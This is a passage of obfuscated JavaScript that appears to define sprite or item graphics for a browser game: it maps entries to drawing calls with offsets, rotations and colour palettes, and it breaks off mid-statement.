			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆΔΔⵠ][ᐃⵠⲆⵠ] = ⲆΔ.ᐃⵠΔΔⲆΔᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆΔΔⵠ][ΔΔΔ] = ⲆΔ.ΔᐃⲆⲆΔⵠⵠⵠᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆΔΔⵠ][2] = ⲆΔ.ⵠⲆⵠⵠⲆΔⵠⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔⵠᐃⵠ] = ⵠⲆ[Ⲇ.ᐃᐃⲆⲆΔΔⵠ];
			ⵠⲆ[Ⲇ.ᐃΔⵠᐃⵠⲆᐃ] = ⵠⲆ[Ⲇ.ᐃᐃⲆⲆΔΔⵠ];
			ⵠⲆ[Ⲇ.ΔⲆᐃΔᐃΔᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃΔᐃΔᐃ][ᐃⵠⲆ] = ⲆΔ.ⵠⲆⲆΔⵠᐃⲆⲆⲆ;
			ⵠⲆ[Ⲇ.ΔⲆᐃΔᐃΔᐃ][ⵠⲆΔ] = ⲆΔ.ΔΔΔⵠΔⵠⲆΔⵠ;
			ⵠⲆ[Ⲇ.ΔⲆᐃΔᐃΔᐃ][ᐃⲆⵠᐃ] = ⲆΔ.ᐃⵠᐃΔᐃᐃᐃΔⲆ;
			ⵠⲆ[Ⲇ.ΔΔⵠⲆΔΔΔ] = ⵠⲆ[Ⲇ.ΔⲆᐃΔᐃΔᐃ];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆᐃⵠᐃ] = ⵠⲆ[Ⲇ.ΔⲆᐃΔᐃΔᐃ];
			ⵠⲆ[Ⲇ.ⲆⲆᐃⲆⲆᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆᐃⲆⲆᐃᐃ][0] = ⲆΔ.ⵠⵠΔⲆⲆⵠⵠⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆⲆᐃⲆⲆᐃᐃ][ΔⲆᐃᐃ] = ⲆΔ.ΔⵠΔⲆⲆᐃΔⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆⲆᐃⲆⲆᐃᐃ][2] = ⲆΔ.ⵠᐃⲆΔΔⵠⲆⵠⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃΔᐃΔ] = ⵠⲆ[Ⲇ.ⲆⲆᐃⲆⲆᐃᐃ];
			ⵠⲆ[Ⲇ.ΔⵠⲆᐃⵠⵠⵠ] = ⵠⲆ[Ⲇ.ⲆⲆᐃⲆⲆᐃᐃ];
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃΔᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃΔᐃ][ΔΔⵠⵠ] = ⲆΔ.ᐃᐃⵠᐃⲆⵠᐃⵠⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃΔᐃ][1] = ⲆΔ.ⲆⲆΔᐃΔᐃⵠᐃⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃΔᐃ][2] = ⲆΔ.ⵠᐃΔΔⵠΔⲆⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠᐃⵠⵠⵠΔΔ] = ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃΔᐃ];
			ⵠⲆ[Ⲇ.ⵠΔΔⵠⵠⵠⲆ] = ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃΔᐃ];
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆᐃΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆᐃΔⵠ][0] = ⲆΔ.ⲆⲆᐃᐃⲆᐃΔΔⲆ;
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆᐃΔⵠ][1] = ⲆΔ.ⲆⲆⵠⵠⲆΔⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆᐃΔⵠ][2] = ⲆΔ.ᐃⵠⲆᐃⵠΔᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ⵠⵠⵠΔⲆⲆⲆ] = ⵠⲆ[Ⲇ.ⲆⲆΔⲆᐃΔⵠ];
			ⵠⲆ[Ⲇ.ΔΔᐃⵠΔⲆⵠ] = ⵠⲆ[Ⲇ.ⲆⲆΔⲆᐃΔⵠ];
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠⵠⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠⵠⲆⵠ][0] = ⲆΔ.ΔⵠⵠᐃΔᐃΔⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠⵠⲆⵠ][1] = ⲆΔ.ΔⲆⵠΔᐃⲆΔᐃⵠ;
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠⵠⲆⵠ][2] = ⲆΔ.ΔᐃⲆΔΔⵠⵠⲆΔ;
			ⵠⲆ[Ⲇ.ᐃⲆⲆᐃᐃⲆΔ] = ⵠⲆ[Ⲇ.ᐃΔⵠⵠⵠⲆⵠ];
			ⵠⲆ[Ⲇ.ⲆΔΔΔⲆᐃᐃ] = ⵠⲆ[Ⲇ.ᐃΔⵠⵠⵠⲆⵠ];
			ⵠⲆ[Ⲇ.ΔΔΔᐃⵠᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ΔΔΔᐃⵠᐃⲆ][0] = ⲆΔ.ΔⲆᐃⵠᐃᐃⵠⵠⵠ;
			ⵠⲆ[Ⲇ.ΔΔΔᐃⵠᐃⲆ][1] = ⲆΔ.ΔⲆⲆⲆᐃⲆΔⲆΔ;
			ⵠⲆ[Ⲇ.ΔΔΔᐃⵠᐃⲆ][ΔⲆΔΔΔ] = ⲆΔ.ΔⲆᐃⵠⵠΔⲆⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆΔⲆⲆⵠᐃⵠ] = ⵠⲆ[Ⲇ.ΔΔΔᐃⵠᐃⲆ];
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆⲆⵠΔ] = ⵠⲆ[Ⲇ.ΔΔΔᐃⵠᐃⲆ];
			ⵠⲆ[Ⲇ.ⲆᐃⵠⲆᐃⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⵠⲆᐃⲆᐃ][0] = ⲆΔ.ᐃⲆⵠⵠⵠⵠⵠᐃⲆ;
			ⵠⲆ[Ⲇ.ⲆᐃⵠⲆᐃⲆᐃ][ΔⵠΔⵠ] = ⲆΔ.ⲆΔᐃⵠΔⲆΔⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆᐃⵠⲆᐃⲆᐃ][2] = ⲆΔ.ᐃΔⵠⵠΔⵠⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠⵠⵠⲆ] = ⵠⲆ[Ⲇ.ⲆᐃⵠⲆᐃⲆᐃ];
			ⵠⲆ[Ⲇ.ΔⵠⵠⲆⲆⲆⵠ] = ⵠⲆ[Ⲇ.ⲆᐃⵠⲆᐃⲆᐃ];
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔⵠⲆ][0] = ⲆΔ.ⲆΔΔᐃⲆᐃⲆ;
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔⵠⲆ][1] = ⲆΔ.ᐃᐃⵠⵠᐃᐃΔ;
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔⵠⲆ][2] = ⲆΔ.ⵠΔΔΔΔᐃⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ᐃⲆΔΔⵠᐃΔ] = ⵠⲆ[Ⲇ.ΔΔⲆΔΔⵠⲆ];
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔΔΔᐃ] = ⵠⲆ[Ⲇ.ΔΔⲆΔΔⵠⲆ];
			ⵠⲆ[Ⲇ.ⲆΔᐃΔᐃⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃΔᐃⲆⵠ][0] = ⲆΔ.ΔᐃΔⲆΔⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔᐃⲆⵠ][1] = ⲆΔ.ᐃⲆⲆⵠⵠΔᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔᐃⲆⵠ][2] = ⲆΔ.ⲆⵠⵠⵠᐃᐃⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃⲆᐃⵠⲆᐃ] = ⵠⲆ[Ⲇ.ⲆΔᐃΔᐃⲆⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⲆⵠᐃⵠᐃⵠⵠ] = ⵠⲆ[Ⲇ.ⲆΔᐃΔᐃⲆⵠ];
			ⵠⲆ[Ⲇ.ᐃΔⲆᐃⵠΔⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ΔᐃⲆⵠΔΔⲆ,
				x: ᐃⵠⲆ,
				y: 0,
				a: 1,
				r: 0,
				c: ["#352b10", ⵠ[235], ⵠ[408], "#e0e1e0", "#c4c4c4"]
			}], .22, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.Δⵠⵠⵠᐃᐃⵠ] = ⵠⲆ[Ⲇ.ᐃΔⲆᐃⵠΔⵠ];
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃⵠΔ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠⲆⵠᐃⲆⵠⲆ,
				x: Ⲇᐃᐃᐃ,
				y: 0,
				a: 1,
				r: Ⲇᐃᐃᐃ,
				c: ["#352b10", "#349970", "#245c45", "#348361", ⵠ[235], ⵠ[408]]
			}], .2, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆΔΔⲆᐃᐃⵠ] = ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃⵠΔ];
			ⵠⲆ[Ⲇ.ΔⵠᐃⲆΔᐃⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆⲆΔⵠⵠⲆⲆ,
				x: -1,
				y: 0,
				a: 1,
				r: Δⵠᐃ,
				c: [ⵠ[111], ⵠ[178], ⵠ[428], ⵠ[452], ⵠ[314], ⵠ[371], ⵠ[495], ⵠ[336], ⵠ[178], ⵠ[428]]
			}, {
				f: ᐃⵠⵠᐃⵠⲆᐃ,
				x: -1,
				y: 0,
				a: 1,
				r: ⲆⲆⲆᐃ,
				c: [ⵠ[111], ⵠ[178], ⵠ[428], ⵠ[452], ⵠ[314], ⵠ[371], ⵠ[495], ⵠ[336], ⵠ[178], ⵠ[428]]
			}, {
				f: ⲆⵠᐃᐃⵠⲆᐃ,
				x: -ΔⲆⵠ,
				y: 0,
				a: ΔⲆⵠ,
				r: 0,
				c: [ⵠ[111], ⵠ[178], ⵠ[428], ⵠ[452], ⵠ[314], ⵠ[371], ⵠ[495], ⵠ[336], ⵠ[178], ⵠ[428]]
			}], .4, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔⲆΔⲆᐃⵠⲆ] = ⵠⲆ[Ⲇ.ΔⵠᐃⲆΔᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠⲆΔᐃⲆⲆᐃ] = ᐃⲆⲆᐃ(ΔⲆⵠ, [{
				f: ⵠᐃΔᐃᐃⵠⲆ,
				x: ΔΔⵠⵠ,
				y: 0,
				a: 1,
				r: 0,
				c: [ⵠ[496], ⵠ[578]]
			}], 1.2, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆⵠⵠⲆᐃΔᐃ] = ᐃⲆⲆᐃ(ⵠᐃⵠΔ, [{
				f: ΔⲆᐃⲆⵠⵠᐃ,
				x: Ⲇᐃᐃᐃ,
				y: 0,
				a: 1,
				r: 0,
				c: [ⵠ[111], ⵠ[384], ⵠ[430], ⵠ[157]]
			}], .14, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠΔᐃΔⲆΔⲆ] = ⵠⲆ[Ⲇ.ⲆⵠⵠⲆᐃΔᐃ];
			ⵠⲆ[Ⲇ.ⲆᐃΔΔΔⵠΔ] = ᐃⲆⲆᐃ(ᐃᐃⵠ, [{
				f: ⵠⲆᐃΔⵠ,
				x: Ⲇᐃᐃᐃ,
				y: 0,
				a: ⵠⲆΔ,
				r: ⲆⲆⲆᐃ,
				c: [ⵠ[496], ⵠ[578]]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃΔⵠⲆΔⵠ] = ⵠⲆ[Ⲇ.ⲆᐃΔΔΔⵠΔ];
			ⵠⲆ[Ⲇ.ᐃΔⵠᐃⵠᐃᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠⲆᐃΔⵠ,
				x: Δᐃᐃⵠ,
				y: ᐃⵠⲆⵠ,
				a: 1,
				r: Ⲇᐃᐃᐃ,
				c: ["#493d36", "#332b28"]
			}], .7, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔΔᐃΔⲆⲆⵠ] = ⵠⲆ[Ⲇ.ᐃΔⵠᐃⵠᐃᐃ];
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃΔⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠⲆᐃΔⵠ,
				x: ΔⲆⲆ,
				y: ⲆⲆⲆᐃ,
				a: Ⲇᐃⵠ,
				r: ⵠⲆᐃⵠ,
				c: [ⵠ[537], "#b17238"]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆⲆⵠⵠᐃΔⵠ] = ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃΔⲆ];
			ⵠⲆ[Ⲇ.ⲆΔΔⲆᐃΔΔ] = ᐃⲆⲆᐃ(ΔΔΔ, [{
				f: ⵠⲆᐃΔⵠ,
				x: 0,
				y: ⲆⲆⲆᐃ,
				a: ⵠΔΔ,
				r: 0,
				c: [ⵠ[235], ⵠ[408]]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠΔⲆⲆⵠⲆⵠ] = ⵠⲆ[Ⲇ.ⲆΔΔⲆᐃΔΔ];
			ⵠⲆ[Ⲇ.ⵠΔⵠΔΔᐃᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠⲆᐃΔⵠ,
				x: Δⵠᐃ,
				y: 0,
				a: 1,
				r: ᐃⵠⲆⵠ,
				c: ["#328a56", "#449573"]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆⲆⲆΔᐃᐃΔ] = ⵠⲆ[Ⲇ.ⵠΔⵠΔΔᐃᐃ];
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃⵠⵠⲆ] = ᐃⲆⲆᐃ(ⵠⲆΔ, [{
				f: ⵠⲆᐃΔⵠ,
				x: ⵠⲆⲆ,
				y: ⲆΔⵠ,
				a: ᐃᐃⲆΔ,
				r: ⲆΔⵠ,
				c: ["#c98e2f", "#a36b11"]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃⵠⲆΔᐃⲆⲆ] = ⵠⲆ[Ⲇ.ⵠⲆⲆᐃⵠⵠⲆ];
			ⵠⲆ[Ⲇ.ⲆΔᐃⵠⲆΔⲆ] = ⵠⲆ[Ⲇ.ⵠⲆⲆᐃⵠⵠⲆ];
			ⵠⲆ[Ⲇ.ᐃΔⲆⵠᐃⲆⲆ] = ᐃⲆⲆᐃ(ᐃᐃⵠ, [{
				f: ⵠⲆᐃΔⵠ,
				x: ᐃΔΔ,
				y: Δᐃᐃⵠ,
				a: 1,
				r: ᐃΔΔ,
				c: ["#13a56d", "#098a58"]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃⲆΔᐃⵠⲆᐃ] = ⵠⲆ[Ⲇ.ᐃΔⲆⵠᐃⲆⲆ];
			ⵠⲆ[Ⲇ.ΔⲆⵠΔᐃⵠⵠ] = ⵠⲆ[Ⲇ.ᐃΔⲆⵠᐃⲆⲆ];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⵠⲆⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠⲆᐃΔⵠ,
				x: ⵠΔⲆⵠ,
				y: 0,
				a: 1,
				r: Δⵠᐃ,
				c: ["#3a8214", "#4a9c1e"]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃⵠⲆⲆⵠⲆⲆ] = ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⵠⲆⲆ];
			ⵠⲆ[Ⲇ.ᐃᐃΔᐃΔᐃⵠ] = ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⵠⲆⲆ];
			ⵠⲆ[Ⲇ.ᐃⵠⲆΔᐃᐃⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠⲆᐃΔⵠ,
				x: ⵠⲆᐃⵠ,
				y: 0,
				a: 1,
				r: 0,
				c: ["#b22419", "#99110e"]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔΔΔΔⵠΔᐃ] = ⵠⲆ[Ⲇ.ᐃⵠⲆΔᐃᐃⵠ];
			ⵠⲆ[Ⲇ.ᐃΔⲆⵠⵠΔᐃ] = ⵠⲆ[Ⲇ.ᐃⵠⲆΔᐃᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠⵠΔᐃΔⲆⲆ] = ᐃⲆⲆᐃ(ⵠΔⵠΔ, [{
				f: ⵠⲆᐃΔᐃⵠⵠ,
				x: -2,
				y: -ᐃⲆⵠᐃΔ,
				a: 1,
				r: -Math.PI / ΔΔᐃⲆⲆ,
				c: [ⵠ[516], ⵠ[382]]
			}, {
				f: ᐃⲆⵠᐃΔⵠᐃ,
				x: -2,
				y: -2,
				a: ᐃΔᐃⲆ,
				r: -Math.PI / 7,
				c: [ⵠ[507], "#ec8d35", "#e96132"]
			}], .3, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠΔΔⲆᐃΔⵠ] = ⵠⲆ[Ⲇ.ⵠⵠΔᐃΔⲆⲆ];
			ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆᐃⵠ] = ᐃⲆⲆᐃ(ΔᐃᐃⲆ, [{
				f: ⲆⵠⵠⲆⲆᐃⵠ,
				x: -Ⲇⵠⵠᐃ,
				y: -ⵠΔᐃ,
				a: ⵠΔᐃ,
				r: -Math.PI / 7,
				c: [ⵠ[516], ⵠ[382], ⵠ[28], ⵠ[51], "#0c2c2e"]
			}, {
				f: ᐃⲆⵠᐃΔⵠᐃ,
				x: -2,
				y: -1,
				a: ΔⵠⲆΔ,
				r: -Math.PI / 7,
				c: [ⵠ[507], "#ec8d35", "#e96132"]
			}], .3, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃⵠᐃΔⲆⲆ] = ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆᐃⵠ];
			ⵠⲆ[Ⲇ.ΔΔⲆⵠΔⵠⵠ] = ᐃⲆⲆᐃ(ΔΔΔ, [{
				f: ᐃⲆΔΔⲆᐃⲆ,
				x: ⵠⵠΔⲆ,
				y: 0,
				a: 1,
				r: Math.PI / 5,
				c: [ⵠ[111], "#4a3a22", "#362818", "#c7c7c7", "#909090", "#eceaea", ⵠ[408], "#d6d1d1"]
			}], .1, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠΔⲆⲆⵠᐃΔ] = ᐃⲆⲆᐃ(ⵠΔⲆ, [{
				f: ⲆⵠⲆⵠΔⵠⵠ,
				x: 2,
				y: ΔⲆⲆ,
				a: ⲆⵠⲆⲆ,
				r: Math.PI / 5,
				c: [ⵠ[111], ⵠ[407], ⵠ[237], "#eb2933", "#57b74e", "#42a54d", ⵠ[223], ⵠ[374]]
			}], .3, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃⲆⵠⲆⵠⲆΔ] = ᐃⲆⲆᐃ(ΔⲆᐃᐃ, [{
				f: ΔΔᐃⵠⲆⵠᐃ,
				x: Ⲇᐃᐃⵠ,
				y: ⵠⲆᐃⵠ,
				a: 1,
				r: Math.PI / ⲆΔⲆᐃ,
				c: [ⵠ[93], ⵠ[48], "#493425", ⵠ[563], "#5e4530", "#563e2b"]
			}], .15, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠⵠΔᐃᐃᐃⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃΔᐃⲆΔΔᐃ,
				x: Δᐃⵠⵠ,
				y: 0,
				a: 1,
				r: Math.PI / ᐃᐃⲆᐃ,
				c: [ⵠ[111], ⵠ[24], ⵠ[237], "#b1afaf", "#493d36", "#332b28"]
			}], .15, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔⲆᐃⵠⵠΔᐃ] = ᐃⲆⲆᐃ(ᐃᐃⵠ, [{
				f: ⵠⵠⲆⵠᐃⲆᐃ,
				x: ᐃⵠⲆⲆⲆ,
				y: ΔᐃΔΔ,
				a: 1,
				r: Math.PI / ⲆΔΔᐃ,
				c: [ⵠ[111], ⵠ[104], ⵠ[193], ⵠ[104], ⵠ[400], ⵠ[330]]
			}], .15, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔΔⲆⵠⵠΔᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃΔⲆⲆᐃᐃΔ,
				x: ⵠⵠΔⲆ,
				y: 0,
				a: ΔᐃⲆⵠ,
				r: Math.PI / ⲆΔΔᐃ,
				c: [ⵠ[111], "#6ad9e8", ⵠ[448], "#95e9f5", "#022320", "#011e19", ⵠ[210]]
			}], .15, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔⵠᐃᐃⲆᐃⲆ] = ᐃⲆⲆᐃ(ΔΔΔ, [{
				f: ⲆΔⵠΔⲆΔⵠ,
				x: 2,
				y: 0,
				a: ΔΔΔ,
				r: Math.PI / ᐃⲆⵠⵠ,
				c: [ⵠ[111], ⵠ[525], ⵠ[116], "#cc81e7", ⵠ[435], ⵠ[76], ⵠ[210]]
			}], .15, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⲆΔⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃⵠⲆᐃΔ,
				x: -ⵠⵠΔⲆ,
				y: ΔⵠⲆⲆ,
				a: ΔⵠΔⵠ,
				r: -Math.PI / 5,
				c: [ⵠ[111], ⵠ[339], ⵠ[111], ⵠ[516], ⵠ[382], ⵠ[516], ⵠ[382]]
			}], .45, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃⵠΔΔⲆΔ] = ᐃⲆⲆᐃ(ΔⵠⲆΔ, [{
				f: ᐃⵠⲆᐃΔ,
				x: -2,
				y: ⲆΔΔᐃ,
				a: 1,
				r: -Math.PI / 5,
				c: [ⵠ[111], ⵠ[339], ⵠ[111], ⵠ[516], ⵠ[382], ⵠ[24], ⵠ[237]]
			}], .45, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⲆᐃⵠⵠⲆΔΔ] = ᐃⲆⲆᐃ(ⵠΔⵠΔ, [{
				f: ᐃⵠⲆᐃΔ,
				x: -2,
				y: ⵠᐃΔⲆ,
				a: 1,
				r: -Math.PI / 5,
				c: [ⵠ[111], ⵠ[339], ⵠ[111], ⵠ[400], ⵠ[330], ⵠ[104], ⵠ[193]]
			}], .45, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⲆΔΔᐃⵠⲆⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃⵠⲆᐃΔ,
				x: -Δⵠⵠⵠ,
				y: 5,
				a: 1,
				r: -Math.PI / ⵠⵠΔⵠ,
				c: [ⵠ[111], ⵠ[339], ⵠ[111], ⵠ[435], ⵠ[76], ⵠ[226], ⵠ[448]]
			}], .45, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⵠⵠⵠ] = ᐃⲆⲆᐃ(ⵠΔᐃ, [{
				f: ᐃⵠⲆᐃΔ,
				x: -2,
				y: ⵠᐃⲆΔ,
				a: ᐃⲆᐃ,
				r: -Math.PI / ᐃΔΔΔ,
				c: [ⵠ[111], ⵠ[339], ⵠ[111], ⵠ[435], ⵠ[76], ⵠ[525], ⵠ[116]]
			}], .45, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⲆⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⲆⲆⵠ][ΔΔⵠ] = ⲆΔ.ΔᐃΔⲆΔΔⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⲆⲆⵠ][1] = ⲆΔ.ⲆΔⲆⵠⵠΔΔ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⲆⲆⵠ][2] = ⲆΔ.ᐃⵠΔᐃⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⵠΔΔⵠᐃⲆᐃ] = ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⲆⲆⵠ];
			ⵠⲆ[Ⲇ.ⲆⲆΔⵠⵠΔⵠ] = ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⲆⲆⵠ];
			ⵠⲆ[Ⲇ.ΔΔᐃⲆΔΔᐃ] = ᐃⲆⲆᐃ(ΔⵠⲆΔ, [{
				f: ΔᐃⲆΔⲆⵠⵠ,
				x: -ᐃΔΔΔ,
				y: -ᐃⲆⵠⵠ,
				a: ΔΔᐃⵠ,
				r: 0,
				c: [ⵠ[224], ⵠ[28], ⵠ[51]]
			}], .23, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⵠΔΔᐃΔᐃΔ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃⲆΔᐃⲆ,
				x: -5,
				y: -5,
				a: ⵠΔΔ,
				r: 0,
				c: ["#282823", "#877c2d", ⵠ[104]]
			}], .43, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ᐃⵠⵠᐃⵠᐃⵠ] = ᐃⲆⲆᐃ(ΔΔΔ, [{
				f: ⵠⲆⵠᐃⵠ,
				x: -5,
				y: -5,
				a: 1,
				r: ⵠΔⲆⵠ,
				c: [ⵠ[366], ⵠ[455], ⵠ[225]]
			}], .33, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⲆⵠⲆ] = ᐃⲆⲆᐃ(ⵠΔᐃ, [{
				f: ⵠⲆᐃΔᐃⵠⵠ,
				x: Δᐃᐃᐃ,
				y: -ⵠᐃΔⵠ,
				a: 1,
				r: Math.PI / 2.5,
				c: [ⵠ[516], ⵠ[382]]
			}], .3, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃᐃΔ] = ⵠⲆ[Ⲇ.ᐃⲆⵠⲆⵠⲆΔ];
			ⵠⲆ[Ⲇ.ⲆⵠᐃⵠⵠⲆᐃ] = ⵠⲆ[Ⲇ.ⵠⵠΔᐃᐃᐃⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔᐃⵠⵠ] = ⵠⲆ[Ⲇ.ΔⲆᐃⵠⵠΔᐃ];
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠᐃᐃⲆ] = ⵠⲆ[Ⲇ.ΔΔⲆⵠⵠΔᐃ];
			ⵠⲆ[Ⲇ.ΔⲆⲆΔⲆⲆΔ] = ⵠⲆ[Ⲇ.ΔⵠᐃᐃⲆᐃⲆ];
			ⵠⲆ[Ⲇ.ΔᐃΔΔⲆᐃⲆ] = ⵠⲆ[Ⲇ.ᐃⵠⵠΔⲆΔⲆ];
			ⵠⲆ[Ⲇ.ⲆⲆᐃᐃⲆⵠᐃ] = ⵠⲆ[Ⲇ.ⵠᐃⵠΔΔⲆΔ];
			ⵠⲆ[Ⲇ.ᐃⲆΔᐃⲆⲆⲆ] = ⵠⲆ[Ⲇ.ⲆᐃⵠⵠⲆΔΔ];
			ⵠⲆ[Ⲇ.ⵠΔⵠⵠᐃⵠⲆ] = ⵠⲆ[Ⲇ.ⲆΔΔᐃⵠⲆⲆ];
			ⵠⲆ[Ⲇ.ΔⵠⲆᐃⲆⵠΔ] = ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⵠᐃΔⵠⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃᐃⲆⲆⲆᐃᐃᐃⲆ,
				x: ᐃⵠΔ,
				y: 0,
				a: ⵠΔΔ,
				r: 0
			}], .4, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠᐃⲆᐃ] = ᐃⲆⲆᐃ(ΔΔᐃⵠ, [{
